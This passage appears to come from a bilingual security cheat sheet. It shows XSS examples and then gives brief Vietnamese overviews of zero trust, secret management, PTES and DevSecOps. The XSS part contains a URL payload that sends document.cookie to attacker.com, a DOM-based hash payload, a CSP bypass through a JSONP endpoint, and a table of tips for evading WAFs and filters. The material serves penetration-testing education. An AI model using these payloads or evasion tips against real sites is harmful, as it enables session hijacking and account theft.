
**Crafted Attack URL**:
```
https://shop.example.com/search?q=%3Cimg%20src=x%20onerror=%22fetch('https://attacker.com/log?c='+document.cookie)%22%3E
```

**Delivery**: URL sent via phishing email to target user.

### Example 3: DOM-Based XSS via Hash Fragment

**Scenario**: JavaScript reads URL hash and inserts into DOM

**Vulnerable Code**:
```javascript
document.getElementById('welcome').innerHTML = 'Hello, ' + location.hash.slice(1);
```

**Attack URL**:
```
https://app.example.com/dashboard#<img src=x onerror=alert(document.cookie)>
```

**Result**: Script executes entirely client-side; payload never touches server.

### Example 4: CSP Bypass via JSONP Endpoint

**Scenario**: Site has CSP but allows trusted CDN

**CSP Header**:
```
Content-Security-Policy: script-src 'self' https://cdn.trusted.com
```

**Bypass**: Find JSONP endpoint on trusted domain:
```html
<script src="https://cdn.trusted.com/api/jsonp?callback=alert"></script>
```

**Result**: CSP bypassed using allowed script source.

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| Script not executing | Check CSP blocking; verify encoding; try event handlers (img, svg onerror); confirm JS enabled |
| Payload appears but doesn't execute | Break out of attribute context with `"` or `'`; check if inside comment; test different contexts |
| Cookies not accessible | Check HttpOnly flag; try localStorage/sessionStorage; use no-cors mode |
| CSP blocking payloads | Find JSONP on whitelisted domains; check for unsafe-inline; test base-uri bypass |
| WAF blocking requests | Use encoding variations; fragment payload; null bytes; case variations |


---

<a id="fplus"></a>

## F+: SECURITY NÂNG CAO (Advanced)

### F+.1 — CLOUD & INFRASTRUCTURE SECURITY

#### 1. Zero Trust Architecture
- Mọi request đều phải được xác thực (Identity-based).
- Nguyên tắc Least Privilege: Chỉ cấp quyền vừa đủ.

#### 2. Secret Management (Doppler/Infisical/HashiCorp Vault)
- Tuyệt đối không hardcode API Key.
- Sử dụng công cụ quản lý secret tập trung, tự động rotate key.

### F+.2 — PTES (Penetration Testing Execution Standard)

1. **Pre-engagement**: Xác định phạm vi (Scope).
2. **Intelligence Gathering**: Reconnaissance (Nmap, Subfinder).
3. **Vulnerability Analysis**: Scan (Nuclei, Nessus).
4. **Exploitation**: Khai thác lỗ hổng.
5. **Post-Exploitation**: Duy trì quyền truy cập, leo thang đặc quyền.
6. **Reporting**: Báo cáo chi tiết và cách khắc phục.

### F+.3 — DEVSECOPS INTEGRATION

- Sử dụng GitHub Actions để scan lỗ hổng tự động (SAST/DAST).
- Scan image Docker với Trivy.
- Kiểm tra tính tuân thủ (Compliance) tự động với OPA (Open Policy Agent).
